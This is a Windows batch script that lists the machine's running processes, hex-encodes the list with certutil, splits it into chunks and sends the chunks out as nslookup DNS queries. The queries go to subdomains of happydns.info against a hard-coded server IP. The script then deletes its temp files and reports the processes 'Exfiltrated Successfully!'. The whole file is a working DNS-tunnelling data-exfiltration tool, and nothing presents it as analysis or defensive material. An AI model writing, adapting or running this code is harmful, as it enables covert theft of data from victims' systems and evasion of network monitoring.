@echo off
setlocal EnableDelayedExpansion

:: --- Configuration ---
set "SERVER_IP=134.199.229.158"
set "BASE_DOMAIN=happydns.info"
set "TEMP_TXT=%TEMP%\proc_exact.txt"
set "TEMP_HEX=%TEMP%\proc_exact.hex"
set "TEMP_CHUNKS=%TEMP%\proc_chunks.txt"

echo --- Enumerating Running Processes ---

echo "Name","Id"> "%TEMP_TXT%"
for /f "tokens=1,2 delims=," %%A in ('tasklist /fo csv /nh') do (
    echo %%A,%%B>> "%TEMP_TXT%"
)

echo Converting data to raw hex natively...
:: CHANGED: Using format 12 to guarantee 100% byte alignment
certutil -f -encodehex "%TEMP_TXT%" "%TEMP_HEX%" 12 >nul

if exist "%TEMP_CHUNKS%" del "%TEMP_CHUNKS%"

set "BUFFER="
echo Chunking data...

:: Read raw hex directly without space-stripping
for /f "usebackq delims=" %%L in ("%TEMP_HEX%") do (
    set "BUFFER=!BUFFER!%%L"
    call :CHUNKER
)

:: --- Process the Final Remainder ---
if not "!BUFFER!"=="" (
    :: Verify if the final buffer has an odd number of characters
    set "TEST=!BUFFER!"
    set "IS_ODD=0"
    for /l %%P in (1,1,20) do (
        if not "!TEST!"=="" (
            if "!TEST:~1,1!"=="" set "IS_ODD=1"
            set "TEST=!TEST:~2!"
        )
    )
    :: Pad with 0 if odd
    if !IS_ODD! equ 1 set "BUFFER=!BUFFER!0"
    >>"%TEMP_CHUNKS%" echo !BUFFER!
)
goto :SEND_CHUNKS

:: --- Subroutine to slice strings safely ---
:CHUNKER
if "!BUFFER:~39,1!"=="" goto :EOF
>>"%TEMP_CHUNKS%" echo !BUFFER:~0,40!
set "BUFFER=!BUFFER:~40!"
goto CHUNKER


:SEND_CHUNKS
for /f %%C in ('find /c /v "" ^< "%TEMP_CHUNKS%"') do set "TOTAL_CHUNKS=%%C"

echo Sending !TOTAL_CHUNKS! chunks...

set "CURRENT_SEQ=1"
for /f "usebackq delims=" %%H in ("%TEMP_CHUNKS%") do (
    set "HEX_DATA=%%H"
    
    set "IS_LAST=0"
    if !CURRENT_SEQ! equ !TOTAL_CHUNKS! set "IS_LAST=1"
    
    set "SEQ_PAD=0000!CURRENT_SEQ!"
    set "SEQ_STR=!SEQ_PAD:~-4!"
    
    echo Sending Chunk !CURRENT_SEQ!/!TOTAL_CHUNKS!
    nslookup d!HEX_DATA!.i!SEQ_STR!.e!IS_LAST!.%BASE_DOMAIN% %SERVER_IP% >nul 2>&1
    
    set /a CURRENT_SEQ+=1
)

:: --- Cleanup ---
if exist "%TEMP_TXT%" del "%TEMP_TXT%"
if exist "%TEMP_HEX%" del "%TEMP_HEX%"
if exist "%TEMP_CHUNKS%" del "%TEMP_CHUNKS%"

echo --- Processes Exfiltrated Successfully! ---
pause
exit /b